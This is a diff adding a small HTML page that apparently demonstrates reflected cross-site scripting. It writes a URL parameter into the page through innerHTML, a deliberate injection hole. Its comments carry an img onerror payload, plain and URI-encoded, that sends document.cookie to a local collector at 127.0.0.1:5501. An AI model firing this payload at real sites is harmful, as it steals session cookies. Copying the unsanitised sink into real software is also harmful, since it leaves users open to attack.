@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+  </head>
+  <body>
+    <span>Welcome !, <span id="name"></span></span>
+
+    <!-- <img
+      src="no-data"
+      onerror="var img=document.createElement('img'); img.src=`http://127.0.0.1:5501/cookie?data=${document.cookie}`; document.querySelector('body').appendChild(img)"
+    /> -->
+
+    <script>
+      document.cookie = "name=manojprabhu;";
+    </script>
+
+    <script>
+      const urlParams = new URLSearchParams(window.location.search);
+      document.getElementById("name").innerHTML = urlParams.get("name");
+    </script>
+  </body>
+</html>
+
+<!-- encode to URI - encodeURIComponent('<img src="no-data" onerror="var img=document.createElement(\'img\'); img.src=`http://127.0.0.1:5501/cookie?data=${document.cookie}`; document.querySelector(\'body\').appendChild(img)" />')
+pass this in a param and get manipulate and get the data we want. -->
